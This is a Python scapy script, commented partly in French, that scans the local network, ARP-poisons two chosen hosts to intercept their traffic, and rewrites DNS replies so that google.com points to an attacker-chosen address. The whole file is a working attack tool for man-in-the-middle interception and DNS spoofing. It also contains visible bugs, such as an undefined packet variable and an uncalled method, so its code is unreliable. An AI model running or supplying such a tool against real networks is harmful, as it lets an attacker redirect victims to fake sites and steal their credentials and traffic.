from scapy.all import *
from scapy.all import IP, Ether, ARP, UDP, DNS, DNSRR, DNSQR
from netfilterqueue import NetfilterQueue
import os

# to obtain the network adress
network_addr = get_if_addr(conf.iface).split('.')
network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2] + ".0/24"

frame = Ether(dst="ff:ff:ff:ff:ff:ff")

arp_packet = frame/ARP(pdst=network_addr)

IP_MAC_responses, unans = srp(arp_packet, timeout=2)

MAC_on_network = []
IP_on_network = []

for i in range(len(IP_MAC_responses)):
    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) # to extract MAC from devices on network
    IP_on_network.append(IP_MAC_responses[i][1].psrc) # to extract IP from devices on network

victim1_IP = IP_on_network[1]
victim1_MAC = MAC_on_network[1]

victim2_IP = IP_on_network[2]
victim2_MAC = MAC_on_network[2]

atk_mac = get_if_hwaddr(conf.iface) # to get mac address of hacker (device who run the code)

''' Pour ajouter des noms de domaines, c'est ici '''
false_dns_hosts = {
    b"www.google.com." : "199.16.173.108", 
    b"google.com." : "199.16.173.108",
}

def packet_transfer(packet):
    scapy_packet = IP(packet.get_payload) # transform packet form netfilter to scapy packet
    if scapy_packet.haslayer(DNSRR): # verif si packet est bien du DNS
        print("[Before]:", scapy_packet.summary()) #affiche le packet avant modification
        scapy_packet = modif_packet(scapy_packet)
        print("[After]:", scapy_packet.summary()) #affiche le packet apres modification
        packet.set_payload(bytes(scapy_packet)) # set back as a netfilter packet and put it in the queue
    packet.accept()

def modif_packet(packet):
    name_questionned = packet[DNSQR].qname
    if name_questionned not in false_dns_hosts:
        print("RAS:", name_questionned)
        return packet
    packet[DNS].an = DNSRR(rrname=name_questionned, rdata=false_dns_hosts[name_questionned]) # change the information in the packet
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet


'''
MITM et DNS SPOOFING
'''

queue = NetfilterQueue()

while True:
    spoof_arp_victim2 = Ether(src=atk_mac)/ARP(op=2, pdst=victim2_IP, hwdst=victim2_MAC, psrc=victim1_IP)
    send_spoof2 = sendp(spoof_arp_victim2)
    spoof_arp_victim1 = Ether(src=atk_mac)/ARP(op=2, pdst=victim1_IP, hwdst=victim1_MAC, psrc=victim2_IP)
    send_spoof1 = sendp(spoof_arp_victim1)
    queue.bind(0, dns_packet)
    queue.run()
    packet_transfer(dns_packet)
    